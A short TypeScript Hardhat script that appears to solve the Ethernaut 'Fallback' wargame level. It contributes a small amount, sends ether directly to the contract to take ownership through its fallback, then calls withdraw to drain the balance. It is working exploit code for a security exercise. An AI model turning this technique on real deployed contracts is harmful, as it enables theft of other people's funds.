// import dotenv from "dotenv";
// dotenv.config();

import { ethers } from "hardhat";

import { abi } from "../artifacts/contracts/01-Fallback.sol/Fallback.json";

const provider = new ethers.JsonRpcProvider(process.env.ALCHEMY_API_KEY_URL);

const contractAddress = "0xd039cdF2FF345F075C643B6566f0B081908Ed024";

const main = async () => {
  const contract = new ethers.Contract(contractAddress, abi, provider);

  const fallback = await ethers.getContractAt("Fallback", contractAddress);

  console.log("Contract address:", fallback.target);

  // get signer from private key
  const [signer] = await ethers.getSigners();

  console.log("Signer address:", signer.address);

  const balance = await provider.getBalance(contractAddress);
  console.log("Contract balance:", ethers.formatEther(balance));

  const depositAmount = ethers.parseEther("0.0002");

  // contribute to fallback contract
  const tx = await fallback.contribute({ value: depositAmount });
  await tx.wait();

  // send ether to fallback contract
  const tx1 = await signer.sendTransaction({
    to: contractAddress,
    value: depositAmount,
  });

  // withdraw from fallback contract
  const tx2 = await fallback.withdraw();
  await tx2.wait();

  console.log("Success");
};

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
